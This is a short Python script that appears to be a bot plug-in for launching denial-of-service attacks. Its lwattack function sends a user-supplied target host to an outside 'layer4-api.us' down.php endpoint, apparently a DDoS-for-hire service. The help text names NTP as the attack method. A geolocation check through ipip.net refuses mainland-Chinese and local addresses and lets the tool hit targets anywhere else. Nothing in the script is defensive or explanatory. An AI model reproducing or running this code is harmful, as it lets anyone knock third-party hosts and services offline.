#!/usr/bin/env python3
# -*- encoding:utf-8 -*-

import requests
from socket import gethostbyname


def ipipcheck(ipaddr):
    try:
        req_ip = gethostbyname(ipaddr)
    except:
        return -1
    query_url = 'http://freeapi.ipip.net/' + str(req_ip)
    r = requests.get(query_url)
    resp = r.text[1:-1]
    if r.text == '"not found"':
        return 2
    try:
        resp = resp.split(sep=',')
        if resp[0] == '"中国"':
            if resp[1] == '"香港"' or resp[1] == '"台湾"' or resp[1] == '"台湾"':
                return 1
            else:
                return 2
        elif resp[0] == '"局域网"' or resp[0] == '"本机地址"' or resp[0] == '"保留地址"':
            return 2
        else:
            return 0
    except:
        return -127


def lwhelp():
    helpmsg = '''
    Method == NTP, Only support IP/HOST.
    Port is unwanted. NOT SUPPORT CHINA MAINLAND IP!
    '''
    return helpmsg


def lwattack(dest):
    url_base = 'http://layer4-api.us/api/down.php?host='
    query_url = url_base + str(dest)
    r = requests.get(query_url)
    if r.status_code == 200:
        return r.text
    else:
        return 'Status Code != 200, Error due to upstream issue or invalid request.'
